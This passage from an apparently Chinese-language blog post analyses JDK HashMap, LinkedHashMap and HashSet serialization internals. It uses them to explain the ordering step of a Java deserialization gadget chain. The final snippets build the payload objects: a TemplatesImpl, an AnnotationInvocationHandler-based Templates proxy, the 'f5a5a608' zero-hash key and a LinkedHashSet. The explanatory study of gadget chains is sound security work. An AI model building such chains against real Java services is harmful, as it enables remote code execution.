<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">V</span> <span style="color:#61afef;font-weight:bold">put</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">==</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">putForNullKey</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e5c07b">int</span> <span style="color:#e06c75">i</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">indexFor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">i</span><span style="color:#56b6c2">];</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">next</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">Object</span> <span style="color:#e06c75">k</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">hash</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">k</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">key</span> <span style="color:#56b6c2">||</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">equals</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">k</span><span style="color:#56b6c2">)))</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">V</span> <span style="color:#e06c75">oldValue</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">value</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">value</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">recordAccess</span><span style="color:#56b6c2">(</span><span style="color:#c678dd">this</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#c678dd">return</span> <span style="color:#e06c75">oldValue</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">modCount</span><span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">i</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#e5c07b">null</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p><code>LinkedHashMap</code>重写了<code>HashMap</code>的<code>addEntry</code>和<code>createEntry</code>方法</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#7f848e">//HashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">((</span><span style="color:#e06c75">size</span> <span style="color:#56b6c2">&gt;=</span> <span style="color:#e06c75">threshold</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">&amp;&amp;</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">null</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">]))</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">resize</span><span style="color:#56b6c2">(</span><span style="color:#d19a66">2</span> <span style="color:#56b6c2">*</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">hash</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e5c07b">null</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">?</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">:</span> <span style="color:#d19a66">0</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">bucketIndex</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">indexFor</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">length</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//LinkedHashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">super</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">addEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">// Remove eldest entry if instructed
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">eldest</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">header</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">after</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">removeEldestEntry</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">eldest</span><span style="color:#56b6c2">))</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#7f848e">//不用管这里
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>            <span style="color:#e06c75">removeEntryForKey</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">eldest</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">key</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//HashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;&gt;(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size</span><span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//LinkedHashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">createEntry</span><span style="color:#56b6c2">(</span><span style="color:#e5c07b">int</span> <span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">K</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">V</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e5c07b">int</span> <span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">old</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;&gt;(</span><span style="color:#e06c75">hash</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">key</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">value</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">old</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">table</span><span style="color:#56b6c2">[</span><span style="color:#e06c75">bucketIndex</span><span style="color:#56b6c2">]</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">e</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#7f848e">//实际上就是table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">e</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">addBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">header</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">size</span><span style="color:#56b6c2">++;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//LinkedHashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">addBefore</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Entry</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">,</span><span style="color:#e06c75">V</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">existingEntry</span><span style="color:#56b6c2">)</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">after</span>  <span style="color:#56b6c2">=</span> <span style="color:#e06c75">existingEntry</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">before</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">existingEntry</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">before</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">before</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">after</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">this</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">after</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">before</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">this</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>可以看到<code>LinkedHashMap</code>的<code>createEntry</code>方法多了一个<code>addBefore</code>方法</p>
<blockquote>
<p>四行代码，总共分四步。</p>
<p>1、将新添加的数据指向后方的数据指向header。</p>
<p>2、将新添加的数据指向前方的数据指向原来header前方指向的数据。这样新添加数据的前后方都指明白了。</p>
<p>3、将新添加数据前方的数据指向后方的指向自己。</p>
<p>4、将新添加后方的数据就是header的指向前方的数据指向自己。这样讲别人指向自己的也指明白了</p>
<p>5，每次添加都是在header前方添加。添加的数据前方指向倒数第二次添加的数据，倒数第二次添加数据的前方指向的是倒数第三次添加的数据，这样数据就全部链起来了。<strong>这一种是按照插入顺序进行排序的</strong>。</p>
<p><a class="link" href="https://blog.csdn.net/qq_38859786/article/details/96146902"  target="_blank" rel="noopener"
    >https://blog.csdn.net/qq_38859786/article/details/96146902</a></p>
</blockquote>
<p><code>LinkedHashMap.put</code>方法相比于<code>HashMap.put</code>方法，就是保证了存入<code>Entry</code>的数据按照插入顺序排序</p>
<p>这有什么用呢？看到<code>HashSet.writeObject</code></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#e5c07b">void</span> <span style="color:#61afef;font-weight:bold">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">ObjectOutputStream</span> <span style="color:#e06c75">s</span><span style="color:#56b6c2">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">throws</span> <span style="color:#e06c75">java</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">io</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">IOException</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">for</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">E</span> <span style="color:#e06c75">e</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">map</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">keySet</span><span style="color:#56b6c2">())</span>
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">s</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">writeObject</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">e</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">//HashMap
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>    <span style="color:#c678dd">public</span> <span style="color:#e06c75">Set</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">&gt;</span> <span style="color:#61afef;font-weight:bold">keySet</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Set</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">ks</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">keySet</span><span style="color:#56b6c2">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">ks</span> <span style="color:#56b6c2">!=</span> <span style="color:#e5c07b">null</span> <span style="color:#56b6c2">?</span> <span style="color:#e06c75">ks</span> <span style="color:#56b6c2">:</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">keySet</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">KeySet</span><span style="color:#56b6c2">()));</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">final</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">KeySet</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">AbstractSet</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">&gt;</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#e06c75">Iterator</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">&gt;</span> <span style="color:#61afef;font-weight:bold">iterator</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">newKeyIterator</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">Iterator</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">&gt;</span> <span style="color:#61afef;font-weight:bold">newKeyIterator</span><span style="color:#56b6c2">()</span>   <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">return</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">KeyIterator</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">private</span> <span style="color:#c678dd">final</span> <span style="color:#c678dd">class</span> <span style="color:#e5c07b">KeyIterator</span> <span style="color:#c678dd">extends</span> <span style="color:#e06c75">HashIterator</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">K</span><span style="color:#56b6c2">&gt;</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">public</span> <span style="color:#e06c75">K</span> <span style="color:#61afef;font-weight:bold">next</span><span style="color:#56b6c2">()</span> <span style="color:#56b6c2">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">return</span> <span style="color:#e06c75">nextEntry</span><span style="color:#56b6c2">().</span><span style="color:#e06c75">getKey</span><span style="color:#56b6c2">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">}</span>
</span></span></code></pre></div><p>可以看到这里是按照<code>Entry</code>内部排序，依次将<code>Entry</code>中的<code>templatesImpl</code>、<code>proxy</code>写入到输入流中的</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">set</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">set</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">set</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">proxy</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span></code></pre></div><p>还有一处区别是</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>        <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">hashMap</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">HashMap</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">put</span><span style="color:#56b6c2">(</span><span style="color:#98c379">&#34;f5a5a608&#34;</span><span style="color:#56b6c2">,</span> <span style="color:#98c379">&#34;Override&#34;</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>		<span style="color:#7f848e">//&#34;f5a5a608&#34;.hashCode() == 0
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>        <span style="color:#e06c75">InvocationHandler</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">InvocationHandler</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">annotationHandlerInvocationHandlerConstructor</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">,</span> <span style="color:#e06c75">hashMap</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">Templates</span> <span style="color:#e06c75">proxy</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">(</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">)</span> <span style="color:#e06c75">Proxy</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">newProxyInstance</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">ClassLoader</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">getSystemClassLoader</span><span style="color:#56b6c2">(),</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">Class</span><span style="color:#56b6c2">[]{</span><span style="color:#e06c75">Templates</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">class</span><span style="color:#56b6c2">},</span> <span style="color:#e06c75">annotationHandlerInvocationHandler</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        proxy.equals(templatesImpl);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span><span style="color:#7f848e">//        HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//        hashMap1.put(templatesImpl,&#34;1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e">//        hashMap1.put(proxy, &#34;1&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">HashSet</span><span style="color:#56b6c2">&lt;</span><span style="color:#e06c75">Object</span><span style="color:#56b6c2">&gt;</span> <span style="color:#e06c75">set</span> <span style="color:#56b6c2">=</span> <span style="color:#c678dd">new</span> <span style="color:#e06c75">LinkedHashSet</span><span style="color:#56b6c2">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">set</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">templatesImpl</span><span style="color:#56b6c2">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">set</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">add</span><span style="color:#56b6c2">(</span><span style="color:#e06c75">proxy</span><span style="color:#56b6c2">);</span>
